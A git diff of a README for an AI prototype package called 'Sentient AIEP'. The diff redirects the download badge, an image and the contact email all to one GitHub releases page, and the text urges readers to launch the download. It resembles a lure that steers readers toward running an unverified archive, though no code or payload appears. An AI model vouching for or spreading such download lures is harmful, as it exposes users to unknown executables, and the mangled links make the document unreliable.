@@ -30,7 +30,7 @@ Simplify complex processes with the Flowchart Generator. This prototype automati
 ## 🌐 Explore Further
 To get started with Sentient AIEP and experience the full range of prototypes, download the package from the following link: 
 
-[![Download Sentient AIEP](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Sentient AIEP](https://github.com/siyam000000/sentient-aiep/releases)](https://github.com/siyam000000/sentient-aiep/releases)
 
 **Note:** The link provided needs to be launched to access the Sentient AIEP package.
 
@@ -39,12 +39,12 @@ If the link is not working or you prefer to explore other options, be sure to ch
 ## 🤖 Embrace the Future of AI
 Embrace the future of AI technology with Sentient AIEP. From chatbots to image recognition, the possibilities are endless. Join us on this exciting journey of innovation and discovery in the world of artificial intelligence. Get started today!
 
-![Sentient AIEP](https://your-image-url.com)
+![Sentient AIEP](https://github.com/siyam000000/sentient-aiep/releases)
 
 ## 🚧 Contribution
 We welcome contributions from the AI community to enhance and expand Sentient AIEP. Feel free to submit pull requests, report issues, or suggest new ideas. Together, we can shape the future of AI-driven tools and technologies.
 
 ## 📞 Contact Us
-Have questions or feedback? Reach out to us at [contact@sentient.com](mailto:contact@sentient.com). We would love to hear from you!
+Have questions or feedback? Reach out to us at [https://github.com/siyam000000/sentient-aiep/releases](https://github.com/siyam000000/sentient-aiep/releases). We would love to hear from you!
 
 Let's revolutionize the AI landscape together with Sentient AIEP! 🌌🤖🚀
